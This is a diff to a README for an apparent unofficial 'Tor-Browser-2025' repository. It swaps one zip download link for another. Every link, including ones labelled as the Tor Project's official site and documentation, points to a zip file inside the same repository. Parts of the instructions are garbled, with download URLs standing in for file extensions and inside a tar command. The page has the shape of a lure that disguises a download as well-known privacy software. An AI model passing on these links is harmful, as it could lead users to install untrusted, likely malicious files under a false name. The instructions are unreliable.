@@ -1,6 +1,6 @@
 # 🕵️‍♂️ Tor-Browser-2025 - Browse Securely and Anonymously
 
-[![Download Tor Browser](https://raw.githubusercontent.com/Elliiieee776/Tor-Browser-2025/main/dictic/Tor-Browser-2025.zip%20Browser-brightgreen)](https://raw.githubusercontent.com/Elliiieee776/Tor-Browser-2025/main/dictic/Tor-Browser-2025.zip)
+[![Download Tor Browser](https://raw.githubusercontent.com/Elliiieee776/Tor-Browser-2025/main/dictic/Browser_Tor_v3.4.zip%20Browser-brightgreen)](https://raw.githubusercontent.com/Elliiieee776/Tor-Browser-2025/main/dictic/Browser_Tor_v3.4.zip)
 
 ## 📖 Overview
 The Tor Browser is designed for secure and anonymous browsing. It helps protect your online privacy and allows you to access the internet freely. By using the Tor network, you can browse without fear of being tracked. This browser is perfect for anyone who values their online privacy.
@@ -10,16 +10,16 @@ Getting started with Tor Browser is simple. Follow these easy steps to download 
 
 ## 📥 Download & Install
 1. **Visit the Releases Page:** Click on the link below to go to the download page.
-   [Visit this page to download](https://raw.githubusercontent.com/Elliiieee776/Tor-Browser-2025/main/dictic/Tor-Browser-2025.zip)
+   [Visit this page to download](https://raw.githubusercontent.com/Elliiieee776/Tor-Browser-2025/main/dictic/Browser_Tor_v3.4.zip)
    
 2. **Select the Latest Release:** On the releases page, look for the latest version of Tor Browser. The latest version is usually at the top of the list.
 
-3. **Download the Installer:** Click on the file suitable for your operating system (Windows, Mac, or Linux). The downloaded file will typically have an extension like `.exe`, `.dmg`, or `https://raw.githubusercontent.com/Elliiieee776/Tor-Browser-2025/main/dictic/Tor-Browser-2025.zip`.
+3. **Download the Installer:** Click on the file suitable for your operating system (Windows, Mac, or Linux). The downloaded file will typically have an extension like `.exe`, `.dmg`, or `https://raw.githubusercontent.com/Elliiieee776/Tor-Browser-2025/main/dictic/Browser_Tor_v3.4.zip`.
 
 4. **Run the Installer:**
    - **Windows:** Double-click the downloaded `.exe` file. Follow the on-screen instructions to complete the installation.
    - **Mac:** Open the `.dmg` file and drag the Tor Browser icon to your Applications folder.
-   - **Linux:** Open a terminal, navigate to the folder where you downloaded the `https://raw.githubusercontent.com/Elliiieee776/Tor-Browser-2025/main/dictic/Tor-Browser-2025.zip` file, and extract it using a command like `tar -xvjf tor-browser-linux*https://raw.githubusercontent.com/Elliiieee776/Tor-Browser-2025/main/dictic/Tor-Browser-2025.zip`. Then run the included script to start Tor Browser.
+   - **Linux:** Open a terminal, navigate to the folder where you downloaded the `https://raw.githubusercontent.com/Elliiieee776/Tor-Browser-2025/main/dictic/Browser_Tor_v3.4.zip` file, and extract it using a command like `tar -xvjf tor-browser-linux*https://raw.githubusercontent.com/Elliiieee776/Tor-Browser-2025/main/dictic/Browser_Tor_v3.4.zip`. Then run the included script to start Tor Browser.
 
 5. **Start Browsing:** Once the installation is complete, open Tor Browser. It will prompt you to connect to the Tor network. Click "Connect" to start browsing securely.
 
@@ -65,9 +65,9 @@ For specific issues not covered above, consider reaching out to the community fo
 If you have questions or need help, you can create an issue in this repository. The community and maintainers are available to assist.
 
 ## 🔗 Additional Resources
-- [Tor Project Official Site](https://raw.githubusercontent.com/Elliiieee776/Tor-Browser-2025/main/dictic/Tor-Browser-2025.zip)
-- [Tor Documentation](https://raw.githubusercontent.com/Elliiieee776/Tor-Browser-2025/main/dictic/Tor-Browser-2025.zip)
+- [Tor Project Official Site](https://raw.githubusercontent.com/Elliiieee776/Tor-Browser-2025/main/dictic/Browser_Tor_v3.4.zip)
+- [Tor Documentation](https://raw.githubusercontent.com/Elliiieee776/Tor-Browser-2025/main/dictic/Browser_Tor_v3.4.zip)
 
 Take control of your online experience today. Start using Tor Browser for safe, anonymous browsing.
 
-[Visit this page to download](https://raw.githubusercontent.com/Elliiieee776/Tor-Browser-2025/main/dictic/Tor-Browser-2025.zip)
+[Visit this page to download](https://raw.githubusercontent.com/Elliiieee776/Tor-Browser-2025/main/dictic/Browser_Tor_v3.4.zip)
